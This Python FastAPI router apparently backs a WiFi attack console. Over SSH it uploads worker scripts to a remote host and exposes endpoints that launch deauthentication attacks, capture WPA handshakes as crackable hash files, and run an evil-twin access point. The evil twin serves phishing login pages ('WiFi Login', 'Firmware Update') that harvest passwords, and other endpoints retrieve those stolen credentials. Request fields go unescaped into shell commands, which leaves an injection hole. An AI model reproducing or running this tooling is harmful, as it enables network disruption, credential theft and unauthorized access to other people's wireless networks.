from fastapi import APIRouter, HTTPException
from fastapi.responses import FileResponse
from pydantic import BaseModel
from app.modules.ai_agent.service import ai_service
from app.core.ssh_manager import ssh_client
import os
import time
import json
from pathlib import Path

router = APIRouter()


class AttackRequest(BaseModel):
    bssid: str
    interface: str = "wlan0"
    channel: str = "1"
    duration: int = 60
    ap_interface: str = "wlan1"
    ssid: str = "Free_WiFi"
    template_html: str = ""
    band: str = "2.4g"


class AIAnalysisRequest(BaseModel):
    ssid: str;
    encryption: str;
    bssid: str


def find_payload_script(script_name: str):
    current_file = Path(__file__).resolve()
    for parent in current_file.parents:
        potential_path = parent / "kali_payloads" / script_name
        if potential_path.exists(): return str(potential_path)
    return None


@router.get("/download/{filename}")
async def download_file(filename: str):
    if ".." in filename: raise HTTPException(400, "Invalid filename")
    possible = [Path.cwd() / "captures" / filename, Path(__file__).resolve().parents[4] / "captures" / filename]
    path = next((p for p in possible if p.exists()), None)
    if not path: raise HTTPException(404, "File not found")
    return FileResponse(path=path, filename=filename, media_type='application/octet-stream')


@router.post("/deauth")
async def start_deauth_attack(req: AttackRequest):
    if not ssh_client.client: ssh_client.connect()
    script = ssh_client.upload_payload(find_payload_script("attack_worker.py"), "attack_worker.py")
    cmd = f"nohup python3 {script} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {req.duration} > /tmp/attack_deauth.log 2>&1 &"
    ssh_client.exec_command(cmd)
    return {"status": "started", "msg": "Deauth Started", "log": "/tmp/attack_deauth.log"}


@router.post("/handshake")
async def start_handshake_capture(req: AttackRequest):
    if not ssh_client.client: ssh_client.connect()
    script = ssh_client.upload_payload(find_payload_script("attack_worker.py"), "attack_worker.py")
    # 调用 handshake 模式
    cmd = f"python3 {script} handshake --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {req.duration}"

    try:
        stdin, stdout, stderr = ssh_client.exec_command(cmd)
        output = stdout.read().decode()
        res = {"status": "failed", "msg": "No handshake", "debug": output}

        # 结果处理
        if "CAPTURED_HS_POTENTIAL" in output:
            remote_prefix = f"/tmp/handshake_{req.bssid.replace(':', '')}"
            local_dir = Path.cwd() / "captures"
            if not local_dir.exists(): local_dir.mkdir(parents=True, exist_ok=True)
            ts = int(time.time())

            # 下载文件
            ssh_client.download_file(f"{remote_prefix}-01.cap",
                                     str(local_dir / f"handshake_{req.bssid.replace(':', '')}_{ts}.cap"))
            ssh_client.download_file(f"{remote_prefix}.hc22000",
                                     str(local_dir / f"handshake_{req.bssid.replace(':', '')}_{ts}.hc22000"))
            res["status"] = "success"
            res["msg"] = "Handshake Captured!"

        return res
    except Exception as e:
        return {"status": "error", "msg": str(e)}


@router.post("/ai/analyze_target")
async def analyze_target(req: AIAnalysisRequest):
    return ai_service.analyze_wifi_target(req.ssid, req.encryption, "Unknown")


@router.get("/eviltwin/templates")
async def get_templates():
    return {"status": "success", "data": [
        {"name": "默认登录",
         "content": "<html><body><h1>WiFi Login</h1><form method='POST'><input name='password' type='password' placeholder='Password'><button>Connect</button></form></body></html>"},
        {"name": "固件升级",
         "content": "<html><body><h1>Firmware Update</h1><p>Enter password:</p><form method='POST'><input name='password' type='password'><button>Update</button></form></body></html>"}
    ]}


@router.post("/eviltwin/start")
async def start_evil_twin(req: AttackRequest):
    if req.interface == req.ap_interface: raise HTTPException(400, "网卡冲突")
    if not ssh_client.client: ssh_client.connect()

    et_script = ssh_client.upload_payload(find_payload_script("eviltwin_worker.py"), "eviltwin_worker.py")
    atk_script = ssh_client.upload_payload(find_payload_script("attack_worker.py"), "attack_worker.py")

    try:
        html = req.template_html.replace('"', '\\"').replace('`', '\\`')

        # 1. 启动 AP
        print(f"[*] Starting AP: {req.ssid} ({req.band}, CH:{req.channel})")
        ssh_client.exec_command("echo '[System] Init AP...' > /tmp/eviltwin.log")
        et_cmd = f"nohup python3 {et_script} --interface {req.ap_interface} --ssid '{req.ssid}' --channel {req.channel} --band {req.band} --template \"{html}\" >> /tmp/eviltwin.log 2>&1 &"
        ssh_client.exec_command(et_cmd)

        # 2. 启动 Deauth (强制无限时长)
        print(f"[*] Starting Deauth: {req.bssid}")
        ssh_client.exec_command("echo '[System] Init Deauth...' > /tmp/et_deauth.log")
        deauth_cmd = f"nohup python3 {atk_script} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration 0 >> /tmp/et_deauth.log 2>&1 &"
        ssh_client.exec_command(deauth_cmd)

        return {"status": "started", "msg": "双子攻击已启动"}
    except Exception as e:
        raise HTTPException(500, str(e))


@router.post("/eviltwin/stop")
async def stop_evil_twin():
    if not ssh_client.client: ssh_client.connect()
    ssh_client.exec_command("pkill -f eviltwin_worker.py; pkill -f attack_worker.py")
    ssh_client.exec_command("killall hostapd dnsmasq aireplay-ng")
    ssh_client.exec_command("iptables --flush && iptables -t nat --flush")
    return {"status": "stopped"}


@router.get("/eviltwin/credentials")
async def get_credentials():
    if not ssh_client.client: ssh_client.connect()
    try:
        _, stdout, _ = ssh_client.exec_command("cat /tmp/eviltwin/captured_creds.txt")
        return {"status": "success", "data": [l.strip() for l in stdout.read().decode().splitlines() if l.strip()]}
    except:
        return {"status": "empty", "data": []}


@router.get("/eviltwin/logs")
async def get_logs():
    if not ssh_client.client: ssh_client.connect()
    try:
        _, stdout, _ = ssh_client.exec_command(
            "tail -n 10 /tmp/eviltwin.log; echo '---'; tail -n 10 /tmp/et_deauth.log")
        return {"status": "success",
                "logs": [l.strip() for l in stdout.read().decode().splitlines() if l.strip() and l != "---"]}
    except:
        return {"status": "error", "logs": []}